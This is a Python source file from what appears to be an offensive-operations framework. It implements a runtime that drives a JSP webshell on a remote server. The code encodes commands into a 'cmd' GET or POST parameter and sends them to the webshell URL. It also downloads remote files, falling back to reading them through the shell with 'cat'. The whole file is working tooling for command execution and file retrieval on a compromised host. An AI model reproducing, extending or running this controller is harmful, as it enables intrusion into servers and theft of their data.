"""JSP webshell runtime — TransportBackedRuntime with JSP cmd encoding."""

from __future__ import annotations

import tempfile
import urllib.parse
from datetime import datetime, timezone
from pathlib import Path

from dsp.execution.providers.runtime.command import (
    CommandExecutionError,
    CommandRequest,
    CommandResult,
    CommandStatus,
)
from dsp.execution.providers.runtime.runtime_models import RuntimeArtifact, RuntimeSession
from dsp.execution.providers.runtime.transport import (
    TransportBackedRuntime,
    TransportRuntimeConfiguration,
)
from dsp.execution.providers.webshell.jsp.jsp_command_encoder import JspCommandEncoder
from dsp.execution.webshell.cat_transport import read_remote_file_via_cat
from dsp.execution.webshell.event_sync.bundle_content import validate_jsonl_content
from dsp.execution.webshell.transport.models import TransportRequest, TransportResponse


class JspWebshellRuntime(TransportBackedRuntime):
    """JSP-specific runtime — ``cmd`` GET/POST dispatch via RealHttpTransport."""

    def __init__(
        self,
        transport,
        *,
        event_sync_bridge=None,
        event_store=None,
        provider_type: str = "jsp",
        webshell_url: str = "",
        config: TransportRuntimeConfiguration | None = None,
    ) -> None:
        super().__init__(
            transport,
            event_sync_bridge=event_sync_bridge,
            event_store=event_store,
            command_encoder=JspCommandEncoder(),
            provider_type=provider_type,
            webshell_url=webshell_url,
            config=config,
        )

    def _command_transport_request(
        self,
        encoded_payload: str,
        *,
        transport_method: str,
        timeout_seconds: float,
    ) -> TransportRequest:
        if transport_method == "send_get":
            return TransportRequest(
                url=self._webshell_url,
                method="GET",
                params={JspCommandEncoder.COMMAND_PARAM: encoded_payload},
                timeout_seconds=timeout_seconds,
                metadata={
                    "command_transport": True,
                    "jsp_encoding": "get_cmd_param",
                },
            )
        body = urllib.parse.urlencode(
            {JspCommandEncoder.COMMAND_PARAM: encoded_payload}
        ).encode("utf-8")
        return TransportRequest(
            url=self._webshell_url,
            method="POST",
            body=body,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout_seconds=timeout_seconds,
            metadata={
                "command_transport": True,
                "jsp_encoding": "post_cmd_form",
            },
        )

    def execute_command(self, request: CommandRequest) -> CommandResult:
        """Deliver a JSP command via transport — transport outcome metadata only."""
        session = self._active_session()
        self._require_connected(session, operation="execute_command")
        prepared = self.prepare_command(request)
        self.validate_command(prepared)
        started_at = datetime.now(timezone.utc)
        try:
            encoded_payload = self._command_encoder.encode_request(prepared)
        except (TypeError, ValueError) as exc:
            raise CommandExecutionError(
                f"command encoding failed: {exc}",
            ) from exc
        payload_size = len(encoded_payload.encode("utf-8"))
        transport_method = self._select_command_transport_method(payload_size)
        transport_request = self._command_transport_request(
            encoded_payload,
            transport_method=transport_method,
            timeout_seconds=float(prepared.timeout_seconds),
        )
        if transport_method == "send_get":
            response = self._dispatch_command(
                "execute_command",
                prepared.command_id,
                lambda: self._transport.send_get(transport_request),
            )
        else:
            response = self._dispatch_command(
                "execute_command",
                prepared.command_id,
                lambda: self._transport.send_post(transport_request),
            )
        completed_at = datetime.now(timezone.utc)
        return CommandResult(
            command_id=prepared.command_id,
            status=CommandStatus.COMPLETED,
            started_at=started_at,
            completed_at=completed_at,
            execution_metadata=self._jsp_execution_metadata(
                transport_method=transport_method,
                payload_size=payload_size,
                response=response,
            ),
        )

    def download_artifact(
        self,
        session: RuntimeSession,
        artifact: RuntimeArtifact,
    ) -> RuntimeArtifact:
        """Download remote files — remote_path GET, then JSP ``cat`` fallback."""
        stored = self._get_session(session.session_id)
        self._require_connected(stored, operation="download_artifact")
        response = self._dispatch_transfer(
            "download_artifact",
            lambda: self._transport.download(
                self._transfer_request(),
                remote_path=artifact.remote_path,
            ),
        )
        body = response.body
        if self._should_fallback_to_cat_download(body):
            body = read_remote_file_via_cat(self, artifact.remote_path)
        if artifact.local_path:
            local_path = artifact.local_path
            dest = Path(local_path)
            dest.parent.mkdir(parents=True, exist_ok=True)
            dest.write_bytes(body)
        else:
            with tempfile.NamedTemporaryFile(
                mode="wb",
                suffix=".jsonl",
                delete=False,
            ) as bundle_file:
                bundle_file.write(body)
                local_path = bundle_file.name
        return self._artifact_from_response(
            artifact,
            transfer_status="downloaded",
            response=response,
            local_path=local_path,
            size_bytes=len(body),
        )

    @staticmethod
    def _should_fallback_to_cat_download(body: bytes) -> bool:
        validation = validate_jsonl_content(body)
        return not validation.valid

    @staticmethod
    def _jsp_execution_metadata(
        *,
        transport_method: str,
        payload_size: int,
        response: TransportResponse,
    ) -> dict[str, object]:
        """Transport-only metadata — no response body parsing or success inference."""
        return {
            "transport_method": transport_method,
            "request_size": payload_size,
            "transport_status": response.status_code,
            "transport_response_size": len(response.body),
            "transport_duration_ms": response.duration_ms,
            "delivery_only": True,
            "jsp_command_param": JspCommandEncoder.COMMAND_PARAM,
        }
